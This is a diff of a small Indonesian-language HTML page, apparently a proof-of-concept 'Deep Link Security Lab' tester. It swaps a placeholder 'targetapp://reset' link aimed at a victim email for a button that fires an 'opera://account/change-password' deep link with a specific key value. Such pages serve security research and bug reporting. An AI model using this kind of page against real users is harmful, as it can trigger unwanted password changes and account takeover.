@@ -1,26 +1,28 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Deep Link Test</title>
+    <meta charset="UTF-8">
+    <title>Deep Link Security Lab - Research Tool</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background-color: #f4f4f9; }
+        .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        code { background: #e7e7e7; padding: 2px 4px; border-radius: 4px; display: block; margin: 10px 0; word-break: break-all; }
+        button { padding: 15px; width: 100%; cursor: pointer; background: #e95420; color: white; border: none; font-size: 16px; border-radius: 4px; }
+    </style>
 </head>
 <body>
-    <h1>Deep Link Security Tester</h1>
-    <p>Klik tombol di bawah untuk mengetes apakah aplikasi target menangani skema URL dengan aman.</p>
-    
-    <!-- Ganti 'targetapp' dengan skema aplikasi yang Anda temukan di Info.plist -->
-    <!-- Ganti 'reset' dan 'token' sesuai hasil reverse engineering Anda -->
-    <a href="targetapp://reset?token=12345&email=korban@email.com">
-        <button style="padding: 20px; font-size: 20px; background-color: red; color: white;">
-            Test Reset Password Via Deep Link
-        </button>
-    </a>
+    <div class="container">
+        <h2>Deep Link Tester</h2>
+        <p>Aksi: Memicu Deep Link ke aplikasi target.</p>
+        
+        <p><strong>Target URL:</strong></p>
+        <code>opera://account/change-password?key=d8zevg-baa5c2aaffcc7dbc4b8007c116b1e928&service=auth</code>
 
-    <script>
-        // Opsional: Mencoba memicu secara otomatis (beberapa browser memblokir ini)
-        window.onload = function() {
-            console.log("Mencoba memicu deep link...");
-            // window.location.href = "targetapp://reset?token=12345&email=korban@email.com";
-        };
-    </script>
+        <a href="opera://account/change-password?key=d8zevg-baa5c2aaffcc7dbc4b8007c116b1e928&service=auth">
+            <button>Uji Coba Deep Link (Change Password)</button>
+        </a>
+
+        <p><small>Catatan: Pastikan aplikasi target terinstal di perangkat Anda untuk memvalidasi apakah skema ini terdaftar dan aktif.</small></p>
+    </div>
 </body>
 </html>
